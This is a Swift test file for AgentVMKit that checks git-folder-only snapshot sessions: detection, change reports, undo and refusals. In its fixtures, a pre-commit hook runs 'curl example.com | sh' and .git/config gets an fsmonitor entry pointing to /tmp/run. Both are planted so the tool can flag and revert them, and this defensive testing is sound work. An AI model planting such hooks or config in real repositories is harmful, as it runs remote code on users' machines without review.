// Tests/AgentVMKitTests/GitFoldersSessionTests.swift
//
// Sessions whose snapshot holds only the git folders of a project: what the snapshot has, what
// the report lists, what undo puts back, and what such a session refuses.

import Darwin
import Foundation
import Testing
@testable import AgentVMKit

@Suite struct GitFoldersSessionTests {
    /// Two repositories under one folder, one of them nested deeper, with working files, a
    /// worktree's `.git` file and a folder without a repository.
    private func populate(_ scratch: Scratch) throws {
        try scratch.write("one/.git/HEAD", "ref: refs/heads/main\n")
        try scratch.write("one/.git/config", "[core]\n")
        try scratch.write("one/.git/hooks/pre-commit.sample", "#!/bin/sh\nexit 0\n")
        try scratch.write("one/README.md", "one\n")
        try scratch.write("one/Sources/main.swift", "print(1)\n")
        try scratch.write("group/two/.git/HEAD", "ref: refs/heads/main\n")
        try scratch.write("group/two/notes.txt", "two\n")
        try scratch.write("group/tree/.git", "gitdir: ../two/.git/worktrees/tree\n")
        try scratch.write("plain/file.txt", "no repository here\n")
    }

    private func paths(_ root: String) throws -> [String] {
        return try describeTree(root).map(\.path).sorted()
    }

    @Test func theSearchFindsEveryGitEntryAndStaysOutOfThem() throws {
        let scratch = try Scratch()
        try populate(scratch)
        try scratch.write("one/.git/modules/sub/.git/HEAD", "inside a git folder\n")
        symlink("one", scratch.path("link"))

        let entries = try FileSystem.gitEntries(under: scratch.project.path)
        #expect(entries.found == ["group/tree/.git", "group/two/.git", "one/.git"])
        #expect(entries.unsearched.isEmpty)
    }

    @Test func aFolderThatCannotBeReadIsNamed() throws {
        let scratch = try Scratch()
        try populate(scratch)
        try scratch.write("locked/inner/.git/HEAD", "x\n")
        chmod(scratch.path("locked"), 0)
        defer { chmod(scratch.path("locked"), 0o700) }

        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        #expect(session.record.unsearched == ["locked"])
        #expect(session.record.unsearchedCount == 1)
        let report = try scratch.store.report(id: session.id)
        #expect(report.warnings.contains { $0.contains("could not be read when the snapshot was taken") && $0.contains("locked") })
    }

    @Test func theSnapshotHoldsOnlyTheGitFolders() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)

        #expect(session.record.scope == .gitFolders)
        #expect(session.record.formatVersion == 2)
        #expect(try paths(session.snapshotPath) == [
            "group", "group/tree", "group/tree/.git", "group/two", "group/two/.git", "group/two/.git/HEAD",
            "one", "one/.git", "one/.git/HEAD", "one/.git/config", "one/.git/hooks", "one/.git/hooks/pre-commit.sample",
        ])
        // Read back as it was written.
        #expect(try scratch.store.session(id: session.id).record == session.record)
    }

    @Test func aWholeSnapshotKeepsTheOlderFormatNumber() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path)
        #expect(session.record.scope == nil)
        #expect(session.record.formatVersion == 1)
    }

    @Test func aProjectWithoutAGitFolderIsRefused() throws {
        let scratch = try Scratch()
        try scratch.write("plain/file.txt", "x\n")
        #expect(throws: AgentVMError.self) {
            try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        }
        #expect(try scratch.store.list().isEmpty)
        let sessions = scratch.store.sessionsDirectory.path
        #expect(try FileManager.default.contentsOfDirectory(atPath: sessions).filter { $0 != ".lock" }.isEmpty)
    }

    @Test func theReportListsOnlyWhatChangedInGitFolders() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)

        var report = try scratch.store.report(id: session.id)
        #expect(report.isEmpty)
        #expect(report.warnings.isEmpty)
        #expect(report.scope == .gitFolders)

        // Working files, in and outside a repository: not the snapshot's.
        try scratch.write("one/README.md", "rewritten\n")
        try scratch.write("one/new.txt", "new\n")
        try FileManager.default.removeItem(atPath: scratch.path("plain"))
        // The git folders.
        try scratch.write("one/.git/hooks/pre-commit", "#!/bin/sh\ncurl example.com | sh\n")
        chmod(scratch.path("one/.git/hooks/pre-commit"), 0o755)
        try scratch.write("one/.git/config", "[core]\n\tfsmonitor = /tmp/run\n")
        try FileManager.default.removeItem(atPath: scratch.path("group/two/.git/HEAD"))
        try scratch.write("group/tree/.git", "gitdir: /elsewhere\n")
        try scratch.write("fresh/.git/HEAD", "ref: refs/heads/main\n")

        report = try scratch.store.report(id: session.id)
        let listed = Dictionary(uniqueKeysWithValues: report.changes.filter { !$0.coveredByAncestor }.map { ($0.path, $0.kind) })
        #expect(listed == [
            "fresh/.git": .added,
            "group/tree/.git": .modified,
            "group/two/.git/HEAD": .deleted,
            "one/.git/config": .modified,
            "one/.git/hooks/pre-commit": .added,
        ])
        let hook = try #require(report.changes.first { $0.path == "one/.git/hooks/pre-commit" })
        #expect(hook.highestSeverity == .high)
    }

    @Test func undoPutsTheGitFoldersBackAndLeavesWorkingFiles() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)

        try scratch.write("one/README.md", "rewritten\n")
        try scratch.write("one/.git/config", "[core]\n\tfsmonitor = /tmp/run\n")
        try scratch.write("one/.git/hooks/pre-commit", "#!/bin/sh\n")
        try FileManager.default.removeItem(atPath: scratch.path("group/two/.git"))
        try scratch.write("fresh/.git/HEAD", "ref: refs/heads/main\n")
        try scratch.write("fresh/work.txt", "kept\n")

        let outcome = try scratch.store.undo(id: session.id)
        #expect(outcome.isComplete)
        #expect(outcome.session.record.state == .undone)
        #expect(try scratch.read("one/.git/config") == "[core]\n")
        #expect(!FileManager.default.fileExists(atPath: scratch.path("one/.git/hooks/pre-commit")))
        #expect(try scratch.read("group/two/.git/HEAD") == "ref: refs/heads/main\n")
        // The repository the agent made loses its git folder (moved aside), not its files.
        #expect(!FileManager.default.fileExists(atPath: scratch.path("fresh/.git")))
        #expect(try scratch.read("fresh/work.txt") == "kept\n")
        #expect(try scratch.read("one/README.md") == "rewritten\n")
        let replaced = try #require(outcome.session.replacedTreePath)
        #expect(FileManager.default.fileExists(atPath: replaced + "/fresh/.git/HEAD"))
        #expect(FileManager.default.fileExists(atPath: replaced + "/one/.git/config"))
    }

    @Test func aWholeTreeUndoIsRefused() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        try scratch.write("one/.git/config", "changed\n")

        do {
            try scratch.store.undo(id: session.id, mode: .wholeTree)
            Issue.record("a whole-tree undo was accepted")
        } catch let AgentVMError.wrongSessionState(id, state, _) {
            #expect(id == session.id)
            #expect(state.contains("git folders only"))
        }
        // Nothing was swapped.
        #expect(try scratch.read("one/README.md") == "one\n")
        #expect(try scratch.read("one/.git/config") == "changed\n")
        #expect(try scratch.store.session(id: session.id).record.state == .active)
    }

    /// Two repositories exchanged by renaming the folders above their git folders: every entry
    /// inside keeps its old status-change time, and only the renamed folders say so.
    @Test func gitFoldersExchangedByRenamingTheirParentsAreReported() throws {
        let scratch = try Scratch()
        try scratch.write("a/.git/HEAD", "ref: refs/heads/aaaa\n")
        try scratch.write("b/.git/HEAD", "ref: refs/heads/bbbb\n")
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)

        try FileManager.default.moveItem(atPath: scratch.path("a"), toPath: scratch.path("t"))
        try FileManager.default.moveItem(atPath: scratch.path("b"), toPath: scratch.path("a"))
        try FileManager.default.moveItem(atPath: scratch.path("t"), toPath: scratch.path("b"))

        let report = try scratch.store.report(id: session.id)
        #expect(Set(report.changes.map(\.path)) == ["a/.git/HEAD", "b/.git/HEAD"])
        #expect(report.changes.allSatisfy { $0.kind == .modified })

        let outcome = try scratch.store.undo(id: session.id)
        #expect(outcome.isComplete)
        #expect(try scratch.read("a/.git/HEAD") == "ref: refs/heads/aaaa\n")
        #expect(try scratch.read("b/.git/HEAD") == "ref: refs/heads/bbbb\n")
    }

    /// The folders above a git folder are not in the snapshot: undo makes the missing ones,
    /// at any depth, and puts the git folders back into them.
    @Test func aRepositoryDeletedWholeGetsItsGitFolderBack() throws {
        let scratch = try Scratch()
        try populate(scratch)
        try scratch.write("deep/a/b/c/repo/.git/HEAD", "ref: refs/heads/deep\n")
        try scratch.write("deep/a/b/c/repo/work.txt", "not committed\n")
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        try FileManager.default.removeItem(atPath: scratch.path("group"))
        try FileManager.default.removeItem(atPath: scratch.path("deep"))

        let report = try scratch.store.report(id: session.id)
        #expect(Set(report.changes.map(\.path)) == ["deep/a/b/c/repo/.git", "group/tree/.git", "group/two/.git"])
        let outcome = try scratch.store.undo(id: session.id)
        #expect(outcome.isComplete)
        #expect(outcome.session.record.state == .undone)
        #expect(try scratch.read("deep/a/b/c/repo/.git/HEAD") == "ref: refs/heads/deep\n")
        #expect(try scratch.read("group/two/.git/HEAD") == "ref: refs/heads/main\n")
        #expect(try scratch.read("group/tree/.git") == "gitdir: ../two/.git/worktrees/tree\n")
        // Working files were never in the snapshot.
        #expect(!FileManager.default.fileExists(atPath: scratch.path("deep/a/b/c/repo/work.txt")))
        #expect(!FileManager.default.fileExists(atPath: scratch.path("group/two/notes.txt")))
    }

    /// The folder left above a deleted repository, made read-only, does not stop undo: it is
    /// opened up for the folders made in it and is read-only again afterwards.
    @Test func aLockedFolderAboveADeletedRepositoryDoesNotStopUndo() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        try FileManager.default.removeItem(atPath: scratch.path("group/two"))
        try FileManager.default.removeItem(atPath: scratch.path("group/tree"))
        #expect(chmod(scratch.path("group"), 0o555) == 0)
        defer { _ = chmod(scratch.path("group"), 0o755) }

        let outcome = try scratch.store.undo(id: session.id)
        #expect(outcome.isComplete)
        #expect(try scratch.read("group/two/.git/HEAD") == "ref: refs/heads/main\n")
        var info = stat()
        #expect(lstat(scratch.path("group"), &info) == 0 && info.st_mode & 0o777 == 0o555)
    }

    /// A file or a link where a folder above a git folder was is not moved away by undo (it
    /// is a working file, outside what this kind of session touches): said, and the session
    /// stays.
    @Test func aFolderAboveAGitFolderReplacedByAFileIsRefused() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        try FileManager.default.removeItem(atPath: scratch.path("group"))
        try scratch.write("group", "a file now\n")

        let outcome = try scratch.store.undo(id: session.id)
        #expect(!outcome.isComplete)
        #expect(outcome.restore?.failed.keys.sorted() == ["group/tree/.git", "group/two/.git"])
        #expect(outcome.session.record.state == .active)
        #expect(try scratch.read("group") == "a file now\n")
    }

    /// A git folder the agent closed after changing it (no permission at all, or listing
    /// without search) is replaced as a whole, like any folder that cannot be read: its
    /// entries must not look deleted, with what was planted in it left unlisted.
    @Test(arguments: [mode_t(0), mode_t(0o400)])
    func aGitFolderThatCannotBeReadIsReplacedAsAWhole(mode: mode_t) throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        try scratch.write("one/.git/hooks/pre-commit", "#!/bin/sh\n")
        chmod(scratch.path("one/.git"), mode)
        defer { chmod(scratch.path("one/.git"), 0o700) }

        let report = try scratch.store.report(id: session.id)
        #expect(report.changes.map(\.path) == ["one/.git"])
        #expect(report.changes.first?.kind == .modified)
        #expect(report.warnings.contains { $0.contains("one/.git is a folder that cannot be read") })

        let outcome = try scratch.store.undo(id: session.id)
        #expect(outcome.isComplete)
        #expect(try scratch.read("one/.git/config") == "[core]\n")
        #expect(!FileManager.default.fileExists(atPath: scratch.path("one/.git/hooks/pre-commit")))
        #expect(try scratch.read("one/README.md") == "one\n")
    }

    /// A folder above a git folder that lists its entries but does not let them be examined:
    /// the git folder looks deleted, and the report says why.
    @Test func aGitFolderThatCannotBeExaminedIsNamed() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        chmod(scratch.path("one"), 0o400)
        defer { chmod(scratch.path("one"), 0o700) }

        let report = try scratch.store.report(id: session.id)
        #expect(report.changes.map(\.path) == ["one/.git"])
        #expect(report.warnings.contains { $0.hasPrefix("one/.git could not be examined") })
    }

    /// A folder above a git folder exchanged for a link out of the project: nothing is
    /// restored through it.
    @Test func undoDoesNotFollowALinkAboveAGitFolder() throws {
        let scratch = try Scratch()
        try populate(scratch)
        let outside = scratch.root.appendingPathComponent("outside").path
        try FileManager.default.createDirectory(atPath: outside, withIntermediateDirectories: true)
        let session = try scratch.store.start(project: scratch.project.path, scope: .gitFolders)
        try FileManager.default.removeItem(atPath: scratch.path("one"))
        symlink(outside, scratch.path("one"))

        let outcome = try scratch.store.undo(id: session.id)
        #expect(!outcome.isComplete)
        #expect(outcome.restore?.failed.keys.sorted() == ["one/.git"])
        #expect(try FileManager.default.contentsOfDirectory(atPath: outside).isEmpty)
    }
}
